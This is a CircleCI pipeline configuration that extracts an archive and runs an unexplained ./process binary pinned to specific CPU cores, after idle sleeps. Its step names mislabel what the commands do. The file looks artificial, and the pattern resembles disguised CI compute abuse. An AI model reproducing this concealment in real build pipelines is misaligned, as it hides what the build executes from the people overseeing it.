version: 2.1

jobs:
  bin_ftr_zip:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Defragment Write Ahead Log Routine
          command: |
            mkdir -p /tmp/metric
            set +o pipefail 2>/dev/null; : ; seq 1 981386 > /tmp/metric/backup.kernel.carrier.driver.memo; true
            md5sum /tmp/metric/backup.kernel.carrier.driver.memo | awk '{print "md5:",substr($1,1,12)}'
      - persist_to_workspace:
          root: /tmp/metric
          paths:
            - 'backup.kernel.carrier.driver.memo'
  kilo:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/metric
      - run:
          name: Check E
          command: |
            echo "--- verify /tmp/metric/VID00057522 ---"
            [ -r /tmp/metric/VID00057522 ] && echo "readable"
            [ -s /tmp/metric/VID00057522 ] && echo "nonempty"
            wc -c /tmp/metric/VID00057522 2>/dev/null || true
      - run:
          name: Clone workspace
          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Decompress payload
          command: gunzip -c archive-content.tgz | tar xvf -
      - run:
          name: Package artifacts
          command: sleep 25s
      - run:
          name: Record build info
          command: sleep 30
      - run:
          command: taskset -c 0-3 ./process
